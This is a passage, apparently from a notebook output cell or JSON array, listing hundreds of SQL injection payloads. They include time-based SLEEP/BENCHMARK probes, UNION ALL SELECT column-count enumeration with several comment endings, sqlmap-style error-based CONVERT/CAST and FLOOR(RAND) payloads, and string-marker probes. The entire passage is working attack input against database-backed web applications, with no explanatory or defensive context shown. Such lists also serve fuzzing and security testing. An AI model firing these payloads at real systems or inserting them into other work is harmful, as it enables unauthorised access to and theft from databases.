       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \",\n",
       " \"' UNION ALL SELECT 1\",\n",
       " \"' UNION ALL SELECT 1,2\",\n",
       " \"' UNION ALL SELECT 1,2,3\",\n",
       " \"' UNION ALL SELECT 1,2,3,4\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\",\n",
       " \"' UNION ALL SELECT 1#\",\n",
       " \"' UNION ALL SELECT 1,2#\",\n",
       " \"' UNION ALL SELECT 1,2,3#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\",\n",
       " \"' UNION ALL SELECT 1-- \",\n",
       " \"' UNION ALL SELECT 1,2-- \",\n",
       " \"' UNION ALL SELECT 1,2,3-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \",\n",
       " \"' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \",\n",
       " \"' UNION ALL SELECT USER()-- \",\n",
       " \"' UNION ALL SELECT SLEEP(5)-- \",\n",
       " \"' UNION ALL SELECT USER(),SLEEP(5)-- \",\n",
       " \"' UNION ALL SELECT NULL-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \",\n",
       " \"' UNION ALL SELECT NULL#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\",\n",
       " \"' UNION ALL SELECT NULL \",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\",\n",
       " \"' AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\",\n",
       " \"' AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\",\n",
       " \"' AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\",\n",
       " \"' AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\",\n",
       " \"' UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX'\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- \",\n",
